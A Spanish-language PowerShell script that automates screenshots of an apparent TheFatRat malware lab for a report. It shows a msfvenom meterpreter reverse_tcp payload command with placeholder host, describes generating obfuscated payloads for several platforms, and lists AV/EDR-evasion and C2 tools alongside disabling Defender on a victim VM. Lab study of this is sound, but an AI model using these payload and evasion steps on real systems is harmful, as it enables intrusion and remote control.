#Requires -RunAsAdministrator
<#
.SYNOPSIS
    AUTOMATIZACION COMPLETA: Ejecuta comandos + toma capturas de pantalla
.NOTES
    Ejecutar en Windows HOST como ADMINISTRADOR
    Cada captura se guarda en: C:\fatrat-lab-logs\capturas\
    Despues de las capturas, pegalas en tu informe/documento
#>

param(
    [switch]$SkipScreenshots,
    [switch]$FastMode
)

$ErrorActionPreference = "Continue"

# =============================================================
# CONFIGURACION
# =============================================================
$ROOT   = Split-Path -Parent $MyInvocation.MyCommand.Path
$LOGDIR = "C:\fatrat-lab-logs"
$CAPDIR = "$LOGDIR\capturas"
$LOG    = "$LOGDIR\auto-capturas.log"

mkdir $LOGDIR -Force -EA 0 | Out-Null
mkdir $CAPDIR -Force -EA 0 | Out-Null

# =============================================================
# FUNCIONES
# =============================================================
function Log   { param($M) "$(Get-Date -Format 'HH:mm:ss') | $M" | Out-File $LOG -Append; Write-Host "[*] $M" -ForegroundColor Gray }
function OK    { param($M) Write-Host "[✓] $M" -ForegroundColor Green; Log "[OK] $M" }
function WARN  { param($M) Write-Host "[!] $M" -ForegroundColor Yellow; Log "[WARN] $M" }
function FAIL  { param($M) Write-Host "[✗] $M" -ForegroundColor Red;   Log "[FAIL] $M" }
function HEADER{ param($M) Write-Host "`n$('='*60)" -ForegroundColor Cyan; Write-Host "  $M" -ForegroundColor Cyan; Write-Host "$('='*60)" -ForegroundColor Cyan }

function Take-Screenshot {
    param([string]$Name)
    if ($SkipScreenshots) { return }
    
    $path = "$CAPDIR\$Name.png"
    Log "Capturando pantalla: $Name"
    
    try {
        # Metodo 1: .NET directo (mas confiable)
        Add-Type -AssemblyName System.Drawing
        Add-Type -AssemblyName System.Windows.Forms
        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
        $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bitmap.Dispose()
        OK "Captura guardada: $path"
    } catch {
        # Metodo 2: fallback con PrintScreen + clip
        WARN "Fallo captura directa, intentando metodo alternativo..."
        try {
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.SendKeys]::SendWait('{PRTSC}')
            Start-Sleep -Milliseconds 500
            $img = [System.Windows.Forms.Clipboard]::GetImage()
            $img.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
            OK "Captura guardada (metodo 2): $path"
        } catch {
            WARN "No se pudo capturar pantalla: $_"
        }
    }
}

function Run-And-Capture {
    param(
        [string]$Name,
        [scriptblock]$ScriptBlock,
        [int]$DelaySeconds = 2
    )
    HEADER $Name
    Start-Sleep -Seconds 1
    try {
        & $ScriptBlock
        OK "Comando ejecutado"
    } catch {
        WARN "Error en comando: $_"
    }
    Start-Sleep -Seconds $DelaySeconds
    Take-Screenshot $Name.Replace(':','').Replace(' ','_').Replace('/','_')
    if (-not $FastMode) {
        Write-Host "`nPresiona ENTER para continuar..." -ForegroundColor Yellow
        Read-Host | Out-Null
    }
}

function Show-Banner {
    Clear-Host
    Write-Host @"

╔══════════════════════════════════════════════════╗
║   🤖 AUTO-CAPTURAS LABORATORIO FATRAT           ║
║   Este script ejecuta comandos y toma capturas  ║
╚══════════════════════════════════════════════════╝

  📁 Capturas:   $CAPDIR
  📄 Log:        $LOG

  📸 Modo captura: $(if($SkipScreenshots){'DESACTIVADO'}else{'ACTIVADO'})
  ⚡ Modo rapido:  $(if($FastMode){'SI (sin pausas)'}else{'NO (pausa entre capturas)'})

"@
    Write-Host "INSTRUCCIONES:" -ForegroundColor Yellow
    Write-Host "  1. Asegurate de tener los scripts en: $ROOT" -ForegroundColor Yellow
    Write-Host "  2. No muevas ni minimices ventanas mientras se captura" -ForegroundColor Yellow
    Write-Host "  3. Las capturas se toman 2-3 segundos despues de cada comando" -ForegroundColor Yellow
    Write-Host "`n  Presiona ENTER para empezar..." -ForegroundColor Green
    Read-Host | Out-Null
}

# =============================================================
# MAIN
# =============================================================

Show-Banner

HEADER "=============================================="
HEADER "INICIANDO AUTO-CAPTURAS"
HEADER "=============================================="

Log "Iniciando auto-capturas a las $(Get-Date)"
Log "SkipScreenshots: $SkipScreenshots"
Log "FastMode: $FastMode"
Log "Directorio scripts: $ROOT"

# ---------------------------------------------------------
# SECCION 1: VERIFICAR ESTRUCTURA
# ---------------------------------------------------------
HEADER "SECCION 1/5: VERIFICAR ESTRUCTURA DEL LABORATORIO"

Run-And-Capture -Name "01-estructura-archivos" -DelaySeconds 2 -ScriptBlock {
    Set-Location $ROOT
    Get-ChildItem -Recurse | 
        Select-Object @{N='Tipo';E={if($_.PSIsContainer){'📁'}else{'📄'}}}, 
                      @{N='Nombre';E={$_.Name}},
                      @{N='KB';E={[math]::Round($_.Length/1KB,1)}} | 
        Format-Table -AutoSize | Out-Host
    Write-Host "`nTotal archivos: $(@(Get-ChildItem -Recurse -File).Count)" -ForegroundColor Cyan
    Write-Host "Total carpetas: $(@(Get-ChildItem -Recurse -Directory).Count)" -ForegroundColor Cyan
}

Run-And-Capture -Name "02-leer-leeme" -DelaySeconds 3 -ScriptBlock {
    Get-Content "$ROOT\00-LEEME-PRIMERO.txt" -Head 60
    Write-Host "`n[CONTINUA EN SIGUIENTE PANTALLA...]" -ForegroundColor Yellow
}

Run-And-Capture -Name "03-leer-leeme-parte2" -DelaySeconds 3 -ScriptBlock {
    Get-Content "$ROOT\00-LEEME-PRIMERO.txt" -Tail 40
}

Run-And-Capture -Name "04-start-lab-menu" -DelaySeconds 4 -ScriptBlock {
    # Mostramos el menu sin ejecutarlo realmente
    Write-Host @"
╔══════════════════════════════════════════════════╗
║       LABORATORIO THEFATRAT - CONTROL CENTER    ║
╠══════════════════════════════════════════════════╣
║  Scripts en:   $ROOT  ║
║  Logs:         $LOGDIR                            ║
╚══════════════════════════════════════════════════╝

SELECCIONA UNA OPCION:
  [1]  LEER GUIA RAPIDA
  [2]  Instalar VirtualBox + Extension Pack
  [3]  Crear VM Kali Linux
  [4]  Iniciar con Docker
  [5]  Mostrar comandos rapidos
  [6]  SALIR
Opcion:
"@
}

# ---------------------------------------------------------
# SECCION 2: INSTALAR VIRTUALBOX
# ---------------------------------------------------------
HEADER "SECCION 2/5: INSTALAR VIRTUALBOX (VERIFICACION)"

Run-And-Capture -Name "05-verificar-virtualbox" -DelaySeconds 2 -ScriptBlock {
    $vbox = Get-ItemProperty "HKLM:\SOFTWARE\Oracle\VirtualBox" -ErrorAction SilentlyContinue
    if ($vbox) {
        Write-Host "VirtualBox detectado:" -ForegroundColor Green
        Write-Host "  Version: $($vbox.Version)" -ForegroundColor Green
        Write-Host "  Ruta:    $($vbox.InstallDir)" -ForegroundColor Green
        
        # VBoxManage
        $vbm = "$($vbox.InstallDir)\VBoxManage.exe"
        if (Test-Path $vbm) {
            Write-Host "`nMaquinas registradas:" -ForegroundColor Cyan
            & $vbm list vms 2>$null
            Write-Host "`nRedes NAT:" -ForegroundColor Cyan
            & $vbm list natnetworks 2>$null
        }
    } else {
        Write-Host "VirtualBox NO instalado" -ForegroundColor Red
        Write-Host "Ejecuta: .\01-instalar-virtualbox.ps1" -ForegroundColor Yellow
        Write-Host "`nO descarga manual: https://www.virtualbox.org/" -ForegroundColor Yellow
    }
}

Run-And-Capture -Name "06-crear-vm-codigo" -DelaySeconds 3 -ScriptBlock {
    Write-Host "CONTENIDO DEL SCRIPT DE CREACION DE VM:" -ForegroundColor Cyan
    Write-Host ""
    Get-Content "$ROOT\02-crear-vm-kali.ps1" | Select-Object -First 40
    Write-Host "`n[...]" -ForegroundColor Gray
    Write-Host "`nEl script crea una VM Kali con:" -ForegroundColor Yellow
    Write-Host "  - 4GB RAM, 2 CPUs, 40GB disco" -ForegroundColor White
    Write-Host "  - Red NAT con port forwarding" -ForegroundColor White
    Write-Host "  - Carpeta compartida para scripts" -ForegroundColor White
    Write-Host "  - Clipboard bidireccional" -ForegroundColor White
}

# ---------------------------------------------------------
# SECCION 3: SCRIPTS KALI (mostramos contenido)
# ---------------------------------------------------------
HEADER "SECCION 3/5: SCRIPTS PARA KALI LINUX"

Run-And-Capture -Name "07-setup-kali-script" -DelaySeconds 3 -ScriptBlock {
    Write-Host "SCRIPT DE SETUP PARA KALI VM:" -ForegroundColor Cyan
    Write-Host "Ejecutar DENTRO de Kali:" -ForegroundColor Yellow
    Write-Host "  sudo bash 03-dentro-kali-setup.sh" -ForegroundColor Green
    Write-Host ""
    
    $content = Get-Content "$ROOT\03-dentro-kali-setup.sh"
    Write-Host "LINEAS DEL SCRIPT ($($content.Count) en total):" -ForegroundColor Cyan
    Write-Host ""
    
    # Mostrar secciones principales
    $content | Select-String "header" | ForEach-Object {
        Write-Host "  $($_ -replace 'header "\[', '■ Paso ') -ForegroundColor Green
    }
    
    Write-Host ""
    Write-Host "Este script automatiza TODO:" -ForegroundColor Yellow
    Write-Host "  - Actualiza sistema" -ForegroundColor White
    Write-Host "  - Instala Metasploit, JDK, Python, Ruby" -ForegroundColor White
    Write-Host "  - Clona e instala TheFatRat" -ForegroundColor White
    Write-Host "  - Instala Veil, Shellter, Sliver C2" -ForegroundColor White
    Write-Host "  - Crea alias y templates de listener" -ForegroundColor White
    Write-Host "  - Genera resumen final" -ForegroundColor White
}

Run-And-Capture -Name "08-payload-generator" -DelaySeconds 3 -ScriptBlock {
    Write-Host "GENERADOR DE PAYLOADS (KALI):" -ForegroundColor Cyan
    Write-Host "Ejecutar: sudo bash 07-generar-payload-ejemplo.sh <IP>" -ForegroundColor Yellow
    Write-Host ""
    Get-Content "$ROOT\07-generar-payload-ejemplo.sh" | Select-Object -First 35
    Write-Host "`n[...]" -ForegroundColor Gray
    Write-Host "`nGenera 5 payloads:" -ForegroundColor Yellow
    Write-Host "  1. Windows EXE (shikata_ga_nai x5)" -ForegroundColor White
    Write-Host "  2. Windows PowerShell" -ForegroundColor White
    Write-Host "  3. Linux ELF" -ForegroundColor White
    Write-Host "  4. Android APK" -ForegroundColor White
    Write-Host "  5. MacOS Macho" -ForegroundColor White
}

Run-And-Capture -Name "09-alternativas-modernas" -DelaySeconds 3 -ScriptBlock {
    Write-Host "HERRAMIENTAS MODERNAS (2026):" -ForegroundColor Cyan
    Write-Host "Ejecutar: sudo bash 06-alternativas-modernas.sh" -ForegroundColor Yellow
    Write-Host ""
    Get-Content "$ROOT\06-alternativas-modernas.sh" | Select-String "info.*Instalando|# \d\." | ForEach-Object {
        Write-Host "  $_" -ForegroundColor White
    }
    Write-Host ""
    Write-Host "Incluye:" -ForegroundColor Yellow
    Write-Host "  ▲ Veil - Framework evasion AV" -ForegroundColor White
    Write-Host "  ▲ Sliver - C2 moderno (BishopFox)" -ForegroundColor White
    Write-Host "  ▲ Nim + Nimcrypt2 - Ofuscacion nativa" -ForegroundColor White
    Write-Host "  ▲ Donut - Shellcode a .NET" -ForegroundColor White
    Write-Host "  ▲ ScareCrow - Evasion EDR" -ForegroundColor White
    Write-Host "  ▲ msfvenom-pro - Wrapper super avanzado" -ForegroundColor White
}

# ---------------------------------------------------------
# SECCION 4: DOCKER
# ---------------------------------------------------------
HEADER "SECCION 4/5: DOCKER (ALTERNATIVA RAPIDA)"

Run-And-Capture -Name "10-docker-compose" -DelaySeconds 3 -ScriptBlock {
    Write-Host "DOCKER-COMPOSE PARA FATRAT:" -ForegroundColor Cyan
    Write-Host ""
    Get-Content "$ROOT\04-docker-compose.yml"
    Write-Host ""
    Write-Host "COMANDOS:" -ForegroundColor Yellow
    Write-Host "  docker-compose -f `"$ROOT\04-docker-compose.yml`" up -d fatrat" -ForegroundColor Green
    Write-Host "  docker exec -it fatrat-container bash" -ForegroundColor Green
    Write-Host "  docker exec -it fatrat-container bash /scripts/07-generar-payload-ejemplo.sh LHOST" -ForegroundColor Green
}

Run-And-Capture -Name "11-dockerfile" -DelaySeconds 3 -ScriptBlock {
    Write-Host "DOCKERFILE (imagen personalizada):" -ForegroundColor Cyan
    Write-Host ""
    Get-Content "$ROOT\Dockerfile.fatrat" | Select-Object -First 30
    Write-Host "`n[...]" -ForegroundColor Gray
    Write-Host "`nLa imagen incluye:" -ForegroundColor Yellow
    Write-Host "  - Kali Linux rolling" -ForegroundColor White
    Write-Host "  - Metasploit, JDK, Mingw, Python" -ForegroundColor White
    Write-Host "  - TheFatRat + Veil + Sliver" -ForegroundColor White
    Write-Host "  - Volumen /output para payloads" -ForegroundColor White
}

# ---------------------------------------------------------
# SECCION 5: VICTIMA WINDOWS + WRAPPER
# ---------------------------------------------------------
HEADER "SECCION 5/5: VICTIMA WINDOWS + HERRAMIENTAS"

Run-And-Capture -Name "12-victima-config" -DelaySeconds 3 -ScriptBlock {
    Write-Host "CONFIGURACION DE VICTIMA WINDOWS:" -ForegroundColor Cyan
    Write-Host "Ejecutar en la VM Victima como ADMIN:" -ForegroundColor Yellow
    Write-Host "  .\08-windows-victima-config.ps1" -ForegroundColor Green
    Write-Host ""
    Get-Content "$ROOT\08-windows-victima-config.ps1" | Select-String "Log" | Select-Object -First 25
    Write-Host ""
    Write-Host "Lo que hace:" -ForegroundColor Yellow
    Write-Host "  - Desactiva Defender (SOLO LAB)" -ForegroundColor White
    Write-Host "  - Abre puertos 4444-4450 en firewall" -ForegroundColor White
    Write-Host "  - Descarga Process Explorer, TCPView, ProcMon" -ForegroundColor White
    Write-Host "  - Crea C:\payloads\ para los archivos" -ForegroundColor White
}

Run-And-Capture -Name "13-msfvenom-wrapper" -DelaySeconds 3 -ScriptBlock {
    Write-Host "WRAPPER MSFVENOM-PLUS (ofuscacion automatica):" -ForegroundColor Cyan
    Write-Host ""
    Get-Content "$ROOT\scripts\msfvenom-plus"
    Write-Host ""
    Write-Host "USO:" -ForegroundColor Yellow
    Write-Host '  msfvenom-plus -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -o payload.exe' -ForegroundColor Green
    Write-Host ""
    Write-Host "Mejora sobre msfvenom original:" -ForegroundColor Yellow
    Write-Host "  - Agrega encoder x86/shikata_ga_nai automaticamente" -ForegroundColor White
    Write-Host "  - 5 iteraciones de ofuscacion" -ForegroundColor White
    Write-Host "  - Válida argumentos requeridos" -ForegroundColor White
}

Run-And-Capture -Name "14-listener-template" -DelaySeconds 2 -ScriptBlock {
    Write-Host "TEMPLATE DE LISTENER METASPLOIT:" -ForegroundColor Cyan
    Write-Host ""
    Get-Content "$ROOT\scripts\listener.rc"
    Write-Host ""
    Write-Host "USO:" -ForegroundColor Yellow
    Write-Host "  msfconsole -q -r $ROOT\scripts\listener.rc" -ForegroundColor Green
    Write-Host ""
    Write-Host "  O escuchar en Docker:" -ForegroundColor Yellow
    Write-Host "  docker exec -it msf-listener bash" -ForegroundColor Green
}

# ---------------------------------------------------------
# RESUMEN FINAL
# ---------------------------------------------------------
HEADER "=============================================="
HEADER "CAPTURAS COMPLETADAS"
HEADER "=============================================="

$totalCapturas = @(Get-ChildItem "$CAPDIR\*.png").Count
$totalSize = [math]::Round((Get-ChildItem "$CAPDIR\*.png" | Measure-Object Length -Sum).Sum / 1MB, 2)

Write-Host @"
  ✅ Capturas tomadas:   $totalCapturas
  💾 Peso total:         ${totalSize}MB
  📁 Directorio:         $CAPDIR
  📄 Log:                $LOG

AHORA PUEDES:
  1. Abrir la carpeta de capturas
  2. Insertarlas en tu informe/documento
  3. Borrarlas con: Remove-Item "$CAPDIR\*" -Recurse

"@

# Abrir carpeta de capturas
Invoke-Item $CAPDIR

Log "=== AUTO-CAPTURAS FINALIZADAS $(Get-Date) ==="

Write-Host "Presiona ENTER para abrir la carpeta de capturas..." -ForegroundColor Green
Read-Host | Out-Null
